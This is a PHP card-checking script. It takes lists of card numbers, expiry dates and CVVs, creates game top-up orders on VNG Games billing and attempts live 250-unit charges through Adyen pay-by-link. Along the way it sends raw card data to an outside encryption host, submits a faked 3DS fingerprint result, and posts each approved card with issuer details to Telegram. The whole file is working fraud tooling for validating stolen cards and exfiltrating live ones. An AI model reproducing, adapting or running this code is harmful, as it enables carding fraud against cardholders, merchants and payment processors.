<?php
include 'func.php';
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$lista = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

if ($cc[0] == '4') {
    $brand = 'visa';
} elseif ($cc[0] == '5') {
    $brand = 'mastercard';
} elseif ($cc[0] == '3') {
    $brand = 'amex';
} elseif ($cc[0] == '6') {
    $brand = 'discover';
} else {
    $brand = 'unknown';
}

$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];

$cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";
#echo '<span class="text text-success">brand:</span> <span class="text text-success">'.$brand.'</span><br>';
////////////////////////////===[Function start]

function sendRequest($url, $headers, $data = null, $method = 'GET') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

;
$amount = "250";
$bal = substr($amount, 0, 1) == 1 || substr($amount, 0, 1) == 2 ? (substr($amount, 0, 1) == 2 ? '2.800' : '1.500') : $amount;
$desc = 'Zoldyck nạp '.$bal.' THB vào game Cloud Song: บด. x.';
$encoded_desc = base64_encode($desc);
$user_list = [
    "4373_vngcs_576"
    // You can add as many ID as you want here!
];
$random_key = array_rand($user_list);
$vngusername = $user_list[$random_key];
$url = "https://billing.vnggames.com/fe/api/auth/quick";

$headers = [
    "accept: application/json, text/plain, */*",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "origin: https://shop.vnggames.com",
    "priority: u=1, i",
    "referer: https://shop.vnggames.com/",
    "sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$data = http_build_query([
    "platform" => "mobile",
    "clientKey" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjIjoxMDQ3OSwiYSI6MTA0NzksInMiOjF9.LQzHRi6S2R68o4v0ypBj4nZsWqXv-7_oxiUTAPd6zmw",
    "loginType" => 9,
    "lang" => "EN",
    "jtoken" => "",
    "userID" => "",
    "roleID" => $vngusername,
    "roleName" => $vngusername,
    "serverID" => "",
    "getVgaId" => 0
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies
]);
$a = curl_exec($ch);
curl_close($ch);
$response = json_decode($a, true);
$jtoken = $response['data']['jtoken'];
$userID = $response['data']['userID'];
$serverID = $response['data']['serverID'];
$serverName = $response['data']['serverName'];
$roleID = $response['data']['roleID'];
$roleName = $response['data']['roleName'];
#echo '<span class="text text-success">Get user info:</span> <span class="text text-success">'.$a.'</span><br>';
#echo '<span class="text text-success">jtoken</span> <span class="text text-success">'.$jtoken.'</span><br>';
#echo '<span class="text text-success">userID</span> <span class="text text-success">'.$userID.'</span><br>';
#echo '<span class="text text-success">serverID</span> <span class="text text-success">'.$serverID.'</span><br>';
#echo '<span class="text text-success">roleID</span> <span class="text text-success">'.$roleID.'</span><br>';
#echo '<span class="text text-success">roleName</span> <span class="text text-success">'.$roleName.'</span><br>';
#echo '<span class="text text-success">serverName</span> <span class="text text-success">'.$serverName.'</span><br>';
$charge_url = "https://billing.vnggames.com/fe/api/v2/store/getPmcByProducts";

$charge_headers = [
    "accept: application/json, text/plain, */*",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "origin: https://shop.vnggames.com",
    "priority: u=1, i",
    "referer: https://shop.vnggames.com/",
    "sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: same-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$charge_data = http_build_query([
    "lang" => "EN",
    "jtoken" => $jtoken,
    "userID" => $userID,
    "serverID" => $serverID,
    "roleID" => $roleID,
    "roleName" => $roleName,
    "isUsingSubscription" => "false",
    "products" => '[{"productID":"150054","quantity":1}]'
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies
]);

$charge_response = curl_exec($ch);
#echo '<span class="text text-success">charge_response:</span> <span class="text text-success">'.$charge_response.'</span><br>';

$iurl = "https://billing.vnggames.com/fe/api/seagw/payBank";

$idata = http_build_query([
    "pmcID" => "credit_debit_web",
    "paymentGatewayID" => 2,
    "paymentGroupID" => "credit",
    "paymentPartnerID" => "adyen",
    "providerID" => "scheme",
    "amount" => 250,
    "description" => $encoded_desc,
    "currency" => "PHP",
    "country" => "PH",
    "lang" => "EN",
    "jtoken" => $jtoken,
    "serverID" => $serverID,
    "userID" => $userID,
    "roleID" => $roleID,
    "roleName" => $roleName,
    "serverName" => $serverName,
    "productID" => "150054"
]);

$ch = curl_init($iurl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $idata,
    CURLOPT_HTTPHEADER => [
        "accept: application/json, text/plain, */*",
        "accept-language: en-US,en;q=0.9",
        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
        "origin: https://shop.vnggames.com",
        "referer: https://shop.vnggames.com/",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "x-tracking-client-id: 91426000.1750721616",
        "x-tracking-session-id: s1750721623\$o1\$g1\$t1750723929\$j60\$l1\$h1992483351"
    ],
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies
]);

$iresponse = curl_exec($ch);
$redirectUrl = json_decode($iresponse, true)['data']['redirectUrl'];
$orderStatusMessage = json_decode($iresponse, true)['data']['orderStatusMessage'];
$linkID = basename(json_decode($iresponse, true)['data']['redirectUrl']);
#echo '<span class="text text-success">iresponse:</span> <span class="text text-success">'.$iresponse.'</span><br>';
#echo '<span class="text text-success">redirectUrl:</span> <span class="text text-success">'.$redirectUrl.'</span><br>';
#echo '<span class="text text-success">linkID:</span> <span class="text text-success">'.$linkID.'</span><br>';
#echo '<span class="text text-success">orderStatusMessage:</span> <span class="text text-success">'.$orderStatusMessage.'</span><br>';
if ($orderStatusMessage === '[SW]TOO_MANY_REQUESTS_FROM_USER') {
    echo '<span class="text text-warning">Declined</span> <span class="text text-warning">'.$lista.'</span> ➔ <span class="text text-warning">[SW]TOO_MANY_REQUESTS_FROM_USER ('.$vngusername.')</span><br>';
    exit;
}
////////////////////////////===[Encryptor]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://asianprozyy.us/encrypt/adyenv2');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'User-Agent: PostmanRuntime/7.31.1';
$headers[] = 'Content-Type: application/json';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":"'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'","adyenKey":"10001|977A394C52317DBAF43DF6B9C1CCAAF26E8EB0C9B5E70BED82A352285FA3A6CE30BAC631E71C80B26CF7598FFF01D450F634BC9C88A7FE36D36B1EB56CEDF6F919E679904C46AA1D5CE3DBEA21971E1517E92BF7352648487BF99C87FAE25888C71BF1D185C74E9509FE001F748650EF097530367A55ACF04D8543EEEFBCD13F9B0C4D1D76BC7F6820A4F8B41A348AC37D847703CD84CFC36DFD6027E476548FD53E14F5671CAE87F8BDBE4A11DEE3E8BE920495C1C65637AB274208133A2D52BB73E98D2ABD3BC516FF1BD11B2EE2021FF14B8756C2F0A002866A081CAF9D7D47B2EEB7418C3490B96353383DFACBF70E4A4B5B7B482E67CF8B68885FB66CAF","version":"4.5.1","originKey":"live_E32W4ISWVFCTPIRC52BDOI75Q4GLHSGT","origin":"https://checkoutshopper-live.adyen.com/checkoutshopper/"}');
$adyen = curl_exec($ch);
curl_close($ch);

$adyen_key = json_decode($adyen, true);
 
$riskData = $adyen_key['riskData'];
$encryptedCardNumber = $adyen_key['encryptedCardNumber'];
$encryptedExpiryMonth = $adyen_key['encryptedExpiryMonth'];
$encryptedExpiryYear = $adyen_key['encryptedExpiryYear'];
$encryptedSecurityCode = $adyen_key['encryptedSecurityCode'];
$encryptedCardData = $adyen_key['encryptedCardData'];
$encryptedCardNumberv2 = $adyen_key['encryptedCardNumberv2'];
$encryptedExpiryMonthv2 = $adyen_key['encryptedExpiryMonthv2'];
$encryptedExpiryYearv2 = $adyen_key['encryptedExpiryYearv2'];
$encryptedSecurityCodev2 = $adyen_key['encryptedSecurityCodev2'];
$time_processed = $adyen_key['time_processed'];
#echo '<span class="text text-success">riskData</span> <span class="text text-success">'.$riskData.'</span><br>';
#echo '<span class="text text-success">encryptedCardNumber</span> <span class="text text-success">'.$encryptedCardNumber.'</span><br>';
#echo '<span class="text text-success">encryptedExpiryMonth</span> <span class="text text-success">'.$encryptedExpiryMonth.'</span><br>';
#echo '<span class="text text-success">encryptedExpiryYear</span> <span class="text text-success">'.$encryptedExpiryYear.'</span><br>';
#echo '<span class="text text-success">encryptedSecurityCode</span> <span class="text text-success">'.$encryptedSecurityCode.'</span><br>';
//echo '<span class="text text-success">encryptedCardData</span> <span class="text text-success">'.$encryptedCardData.'</span><br>';
//echo '<span class="text text-success">time_processed</span> <span class="text text-success">'.$time_processed.'</span><br>';
////////////////////////////===[Checkout begin]
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://checkoutshopper-live.adyen.com/checkoutshopper/v68/paybylink/setup?generateCheckoutAttemptId=true&openedFromEmail=false&d=$linkID",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        "accept: */*",
        "accept-language: en-US,en;q=0.9",
        "origin: https://eu.adyen.link",
        "priority: u=1, i",
        "referer: https://eu.adyen.link/",
        'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile: ?0",
        'sec-ch-ua-platform: "Windows"',
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: cross-site",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ]
]);
$c = curl_exec($ch);
$checkoutAttemptId = json_decode($c, true)['checkoutAttemptId'];
#echo '<span class="text text-success">c</span> <span class="text text-success">'.$c.'</span><br>';
#echo '<span class="text text-success">checkoutAttemptId</span> <span class="text text-success">'.$checkoutAttemptId.'</span><br>';

$pay_url = 'https://checkoutshopper-live.adyen.com/checkoutshopper/v68/paybylink/payments?d='.$linkID.'';

$pay_headers = [
    "accept: */*",
    "accept-encoding: gzip, deflate",
    "accept-language: en-US,en;q=0.9",
    "content-type: application/json",
    "origin: https://eu.adyen.link",
    "referer: https://eu.adyen.link/",
    "sec-ch-ua: \"Not(A:Brand\";v=\"99\", \"Google Chrome\";v=\"133\", \"Chromium\";v=\"133\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: cross-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
];

$pay_payload = json_encode([
    "riskData" => [
        "clientData" => $riskData
    ],
    "paymentMethod" => [
        "type" => "scheme",
        "brand" => $brand,
        "holderName" => "",
        "encryptedCardNumber" => $encryptedCardNumber,
        "checkoutAttemptId" => $checkoutAttemptId,
        "encryptedSecurityCode" => $encryptedSecurityCode,
        "encryptedExpiryMonth" => $encryptedExpiryMonth,
        "encryptedExpiryYear" => $encryptedExpiryYear
    ],
    "browserInfo" => [
        "acceptHeader" => "*/*",
        "colorDepth" => 24,
        "language" => "en-US",
        "javaEnabled" => false,
        "screenHeight" => 1440,
        "screenWidth" => 2560,
        "userAgent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "timeZoneOffset" => -480
    ],
    "origin" => "https://eu.adyen.link",
    "clientStateDataIndicator" => true
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $pay_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pay_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $pay_payload);
curl_setopt($ch, CURLOPT_ENCODING, "");

$pay_response = curl_exec($ch);
curl_close($ch);
#echo '<span class="text text-success">pay_response</span> <span class="text text-success">'.$pay_response.'</span><br>';
$responseData = json_decode($pay_response, true);
$resultCode = $responseData['resultCode'] ?? '';
////////////////////////////===[Responses]
if (in_array($resultCode, ["IdentifyShopper", "ChallengeShopper"])) {
    $paymentData = json_decode($pay_response, true)['action']['paymentData'];
    #echo '<span class="text text-success">paymentData</span> <span class="text text-success">'.$paymentData.'</span><br>';

    $kurl = "https://checkoutshopper-live.adyen.com/checkoutshopper/v1/submitThreeDS2Fingerprint?token=live_E32W4ISWVFCTPIRC52BDOI75Q4GLHSGT";

    $kpayload = json_encode([
        "fingerprintResult" => "eyJ0aHJlZURTQ29tcEluZCI6IlkifQ==",
        "paymentData" => $paymentData
    ]);

    $kheaders = [
        "accept: application/json, text/plain, */*",
        "accept-language: en-US,en;q=0.9",
        "content-type: application/json",
        "origin: https://eu.adyen.link",
        "priority: u=1, i",
        "referer: https://eu.adyen.link/'.$linkID.'",
        'sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile: ?0",
        'sec-ch-ua-platform: "Windows"',
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: cross-site",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ];

    $ch = curl_init($kurl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $kpayload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $kheaders);
    $k = curl_exec($ch);
    $decodedK = json_decode($k);
    $authorisationToken = json_decode($pay_response, true)['action']['authorisationToken'];
    #echo '<span class="text text-success">3DS Request</span> <span class="text text-success">'.$k.'</span><br>';
    #echo '<span class="text text-success">authorisationToken</span> <span class="text text-success">'.$authorisationToken.'</span><br>';

    if (isset($decodedK->details->threeDSResult)) {
        $threeDSResult = $decodedK->details->threeDSResult;
    } else {
        $threeDSResult = $decodedK->action->authorisationToken ?? '';
    }

    $turl = "https://checkoutshopper-live.adyen.com/checkoutshopper/v68/paybylink/paymentsDetails?d=$linkID";

    $theaders = [
        "accept: */*",
        "accept-language: en-US,en;q=0.9",
        "content-type: application/json",
        "origin: https://eu.adyen.link",
        "priority: u=1, i",
        "referer: https://eu.adyen.link/",
        "sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "sec-fetch-dest: empty",
        "sec-fetch-mode: cors",
        "sec-fetch-site: cross-site",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ];

    $tdata = [
        "details" => [
            "threeDSResult" => $threeDSResult
        ]
    ];

    #echo '<span class="text text-success">threeDSResult</span> <span class="text text-success">'.$threeDSResult.'</span><br>';

    $ch = curl_init($turl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $theaders);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($tdata));
    $t = curl_exec($ch);
    #echo '<span class="text text-success">3DS Card</span> <span class="text text-success">'.$t.'</span><br>';

    if (json_decode($t)->resultCode == 'Authorised') {
        echo '<span class="text text-success">Charge</span> <span class="text text-success">'.$lista.'</span> ➔ <span class="text text-success">Your payment of 250 was approved!</span><br>';
        $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
        "✉️ <b>CARD:</b> $lista\n" .
        "🔍 <b>STATUS:</b> Your payment of 250 was approved! (CVV)\n\n" .
        "ℹ️ <b>🧾 Payment Details</b>\n" .
        "ℹ️ <b>Info:</b> $info\n" .
        "🏦 <b>Issuer:</b> $issuer\n" .
        "🌍 <b>Country:</b> $country_card\n" .
        "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
        $response = sendToTelegram($message);
    } elseif (json_decode($t)->resultCode == 'Refused') {
        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">The transaction has been refused.</span><br>';
    } elseif (json_decode($t)->message == 'The provided 3DS2 result is invalid.'){
        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">3DS Card.</span><br>';
    }else {
        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">Unexpected response: '.$t.'</span><br>';
    }

} else {
    if ($resultCode === "Authorised") {
    echo '<span class="text text-success">Charge</span> <span class="text text-success">'.$lista.'</span> ➔ <span class="text text-success">Your payment of 250 was approved!</span><br>';
    $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
    "✉️ <b>CARD:</b> $lista\n" .
    "🔍 <b>STATUS:</b> Your payment of 250 was approved! (CVV)\n\n" .
    "ℹ️ <b>🧾 Payment Details</b>\n" .
    "ℹ️ <b>Info:</b> $info\n" .
    "🏦 <b>Issuer:</b> $issuer\n" .
    "🌍 <b>Country:</b> $country_card\n" .
    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
    $response = sendToTelegram($message);
    } elseif ($resultCode === "Refused") {
        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">The transaction has been refused.</span><br>';
    } else {
        $status = $responseData['status'] ?? '';
        $errorCode = $responseData['errorCode'] ?? '';
        $message = $responseData['message'] ?? '';
        echo '<span class="text text-danger">Declined</span> <span class="text text-danger">'.$lista.'</span> ➔ <span class="text text-danger">resultCode: ' . $resultCode . ' | status: '.$status.' | errorCode: '.$errorCode.' | message: '.$message.'.</span><br>';
    }
}

ob_flush();

?>